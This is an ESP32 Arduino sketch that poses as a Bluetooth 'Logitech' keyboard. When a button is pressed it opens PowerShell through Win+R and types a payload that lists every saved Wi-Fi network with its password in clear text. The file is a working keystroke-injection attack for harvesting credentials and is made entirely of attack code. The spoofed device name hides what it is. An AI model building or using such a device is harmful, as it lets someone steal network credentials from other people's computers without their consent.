#include <BleKeyboard.h>
#define pin 2
bool laststate1=HIGH;
const char* name="Logitech";
BleKeyboard keyboard(name,"Espressif",80);
bool state1;
void setup(){
  Serial.begin(115200);
  pinMode(pin,INPUT_PULLUP);
  keyboard.begin();
}
void loop(){
  if(keyboard.isConnected()){
    state1=digitalRead(pin);
    if(laststate1==HIGH && state1==LOW){
      Serial.println("Trigger running...");
      keyboard.press(KEY_LEFT_GUI);
      keyboard.press('r');
      delay(500);
      keyboard.releaseAll();
      delay(1000);
      keyboard.print("powershell");
      delay(100);
      keyboard.press(KEY_RETURN);
      delay(500);
      keyboard.releaseAll();
      delay(1000);
      const char* payload = "netsh wlan show profile | Select-String \"All User Profile\" | ForEach-Object { $ssid = $_.ToString().Split(':')[1].Trim(); $passwordLine = netsh wlan show profile name=$ssid key=clear | Select-String \"Key Content\"; if ($passwordLine) { $password = $passwordLine.ToString().Split(':')[1].Trim(); } else { $password = 'No password'; } [PSCustomObject]@{SSID=$ssid;Password=$password} }";
      for(int i=0;i<strlen(payload);i++){
        keyboard.print(payload[i]);
        delay(50);
      }
      delay(100);
      keyboard.press(KEY_RETURN);
      delay(500);
      keyboard.releaseAll();
      laststate1=state1;
    }
    delay(100);
  }
}
